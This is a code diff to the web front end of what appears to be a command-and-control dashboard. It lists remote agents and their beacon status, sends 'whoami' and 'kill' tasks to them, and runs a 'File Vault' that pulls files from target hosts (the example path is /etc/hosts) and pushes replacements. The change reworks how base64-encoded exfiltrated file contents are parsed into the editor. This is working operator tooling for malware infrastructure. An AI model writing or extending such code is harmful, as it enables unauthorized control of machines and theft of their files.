@@ -90,9 +90,7 @@
             text-transform: uppercase;
             color: var(--muted);
         }
-        .chip.windows { color: #d4d4d4; }
-        .chip.linux { color: #d4d4d4; }
-        .chip.mac { color: #d4d4d4; }
+        .chip.windows, .chip.linux, .chip.mac { color: #d4d4d4; }
 
         .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: .4rem; }
         .online { background: var(--success); }
@@ -275,6 +273,19 @@
 </div>
 
 <script>
+    const vaultState = {
+        pendingPullHost: null,
+        pendingPullPath: null,
+    };
+
+    function b64ToUtf8(input) {
+        try {
+            return decodeURIComponent(escape(atob(input)));
+        } catch {
+            try { return atob(input); } catch { return ''; }
+        }
+    }
+
     function osChipClass(family) {
         if (family === 'WINDOWS') return 'windows';
         if (family === 'LINUX') return 'linux';
@@ -319,11 +330,8 @@
 
     function selectAgent(hostname) {
         document.getElementById('target-select').value = hostname;
-        
-        // Also update the File Vault path label if you want to know who you're targeting
         const vaultPath = document.getElementById('vault-path');
         vaultPath.placeholder = `Path on ${hostname} (e.g. /etc/hosts)`;
-        
         document.getElementById('cmd-input').focus();
         updateDashboard();
     }
@@ -343,7 +351,7 @@
 
     async function vaultOp(op) {
         const host = document.getElementById('target-select').value;
-        const path = document.getElementById('vault-path').value;
+        const path = document.getElementById('vault-path').value.trim();
         const content = document.getElementById('vault-editor').value;
 
         if (host === "ALL" || !path) {
@@ -358,45 +366,20 @@
         if (op === 'push') body.append('content', content);
 
         const res = await fetch('/admin/file_op', { method: 'POST', body });
-        if (res.ok) {
-            const msg = op === 'pull' ? "Pull command transmitted. Await beacon." : "Replacement file transmitted.";
-            alert(msg);
-        }
-    }
-
-    // Update your renderResults function to automatically catch file pulls
-    // This logic looks for the specific FILE_PULL output and puts it in the editor
-    function renderResults(results) {
-        const el = document.getElementById('results-feed');
-        const editor = document.getElementById('vault-editor'); // The ID from the new panel
-        
-        if (!results.length) {
-            el.innerHTML = '<div class="text-center text-muted py-4">No execution logs.</div>';
+        if (!res.ok) {
+            alert(`File op failed (${res.status}).`);
             return;
         }
-        
-        el.innerHTML = '';
-        results.forEach(r => {
-            // Check if this result contains exfiltrated file data
-            if (r.output.includes("FILE_DATA_START")) {
-                const parts = r.output.split("FILE_DATA_START");
-                const content = parts[1].split("FILE_DATA_END")[0];
-                
-                // Only update editor if it's currently empty to avoid overwriting mid-edit
-                if (editor.value.trim() === "" || editor.value.includes("File content will appear here")) {
-                    editor.value = content.trim();
-                }
-            }
 
-            el.innerHTML += `
-                <div class="item">
-                    <div class="d-flex justify-content-between">
-                        <div><strong>${r.hostname}</strong> <span class="chip ${osChipClass(r.os_family)}">${r.os_family}</span></div>
-                        <span class="subtle">${r.timestamp}</span>
-                    </div>
-                    <pre class="result-out">${r.output}</pre>
-                </div>`;
-        });
+        if (op === 'pull') {
+            vaultState.pendingPullHost = host;
+            vaultState.pendingPullPath = path;
+            alert("Pull task queued. Wait for next beacon and file will load automatically.");
+        } else {
+            alert("Push task queued. File will be replaced on next beacon.");
+        }
+
+        updateDashboard();
     }
 
     function syncHostFilter(hosts) {
@@ -416,12 +399,15 @@
         const table = document.getElementById('agent-table');
         const assets = document.getElementById('opt-assets');
         const targetSelect = document.getElementById('target-select');
-        
-        // Capture current selection before wipe
         const savedSelection = targetSelect.value;
 
         table.innerHTML = '';
         assets.innerHTML = '';
+
+        if (!agents.length) {
+            table.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-4">No agents match filters.</td></tr>';
+            return;
+        }
 
         agents.forEach(a => {
             const isSelected = savedSelection === a.hostname;
@@ -434,19 +420,16 @@
                     <td>${a.last_seen || '--:--:--'}</td>
                     <td><span class="dot ${statusClass(a.status)}"></span>${a.status}</td>
                     <td>
-                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','whoami')">WHO</button>
+                        <button class="btn btn-sm btn-outline-custom" onclick="triggerAction('${a.hostname}','whoami')">WHO</button>
                         <button class="btn btn-sm btn-outline-danger" onclick="triggerAction('${a.hostname}','kill')">KILL</button>
                     </td>
                 </tr>`;
             assets.innerHTML += `<option value="${a.hostname}">${a.hostname}</option>`;
         });
 
-        // Restore selection so it doesn't jump back to Broadcast
-        if (savedSelection && savedSelection !== "ALL") {
-            targetSelect.value = savedSelection;
-        }
+        if (savedSelection && savedSelection !== "ALL") targetSelect.value = savedSelection;
     }
-    
+
     function renderQueue(queue) {
         const el = document.getElementById('queue-list');
         if (!queue.length) {
@@ -460,6 +443,34 @@
         });
     }
 
+    function maybeApplyFileResult(result) {
+        const output = result.output || '';
+        const editor = document.getElementById('vault-editor');
+
+        if (output.startsWith('FILE_DATA_B64|')) {
+            const parts = output.split('|');
+            if (parts.length >= 3) {
+                const hostMatch = !vaultState.pendingPullHost || vaultState.pendingPullHost === result.hostname;
+                const pathDecoded = b64ToUtf8(parts[1]);
+                const pathMatch = !vaultState.pendingPullPath || vaultState.pendingPullPath === pathDecoded;
+                if (hostMatch && pathMatch) {
+                    editor.value = b64ToUtf8(parts[2]);
+                    vaultState.pendingPullHost = null;
+                    vaultState.pendingPullPath = null;
+                    document.getElementById('vault-path').value = pathDecoded;
+                }
+            }
+        }
+
+        if (output.startsWith('FILE_ERROR_B64|') || output.startsWith('FILE_WRITE_ERROR_B64|')) {
+            const parts = output.split('|');
+            if (parts.length >= 3) {
+                const err = b64ToUtf8(parts[2]);
+                console.warn('File operation error:', err);
+            }
+        }
+    }
+
     function renderResults(results) {
         const el = document.getElementById('results-feed');
         if (!results.length) {
@@ -468,6 +479,7 @@
         }
         el.innerHTML = '';
         results.forEach(r => {
+            maybeApplyFileResult(r);
             el.innerHTML += `<div class="item"><div class="d-flex justify-content-between"><div><strong>${r.hostname}</strong> <span class="chip ${osChipClass(r.os_family)}">${r.os_family}</span></div><span class="subtle">${r.timestamp}</span></div><pre class="result-out">${r.output}</pre></div>`;
         });
     }
